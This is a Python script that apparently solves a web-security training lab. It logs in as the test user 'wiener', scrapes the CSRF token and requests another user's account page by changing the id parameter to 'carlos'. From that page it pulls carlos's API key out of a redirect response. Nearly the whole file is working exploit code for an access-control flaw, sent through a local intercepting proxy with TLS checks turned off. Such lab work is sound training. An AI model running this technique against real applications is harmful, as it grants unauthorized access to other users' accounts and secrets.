import urllib3
import requests as rs
import sys
from bs4 import BeautifulSoup as bs
import re
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

# -----------------------------------------------------------------------------------------------------------------------------
#
#-----------------------------------------------------------------------------------------------------------------------------

# ANSI Colors
COLORS = ['\033[91m', '\033[92m', '\033[93m', '\033[94m', '\033[95m', '\033[96m']
RESET  = '\033[0m'

def cprint(msg):
    color = random.choice(COLORS)
    sys.stdout.write(f"{color}{msg}{RESET}")
#---------------------------------------------------------
#
#------------------------------------------------------------------------------------------------


def get_csrf_token(s,url):
    r = s.get(url,verify=False,proxies=proxies)
    soup = bs(r.text,'html.parser')
    csrf = soup.find('input',{'name':'csrf'})['value']
    csrf_tokens = {'csrf':csrf}
    cprint("[+] CSRF Token : %s\n" % csrf)
    return csrf_tokens
    

def carlos_api_key(s,url):
    # get csrf token from the login page
    login_url = url + '/login'
    csrf_token = get_csrf_token(s,login_url)

    # login as wiener user
    cprint("[+] Login as wiener user\n")
    data_login = {
        'csrf' : csrf_token['csrf'],
        'username' : 'wiener',
        'password' : 'peter'
    }
    r = s.post(login_url,data=data_login,verify=False,proxies=proxies)
    res = r.text
    if 'Log out' in res:
        cprint("[+] Login successful\n")
        
    else:
        cprint("[-] Login failed\n")
        sys.exit(1)

    # access carlos account
    carlos_account_url = url + "/my-account?id=carlos"
    r = s.get(carlos_account_url,verify=False,proxies=proxies,allow_redirects=False)
    resp = r.text
    if 'carlos' in resp:
        cprint("[+] Carlos account accessed\n")
        cprint("[+] Retrieving carlos api key\n")
        api_key = re.findall(r"API Key is: (.*)<\/div>", resp)[0]
        cprint("[+] Carlos API Key is: %s\n" % api_key)
    else:
        cprint("[-] Carlos account not accessed\n")
        sys.exit(1)


def main():
    if len(sys.argv) != 2:
        cprint("Usage: python3 %s <URL>\n" % sys.argv[0])
        sys.exit(1)

    s = rs.Session()
    url = sys.argv[1]

    carlos_api_key(s,url)


if __name__ == "__main__":
    main()
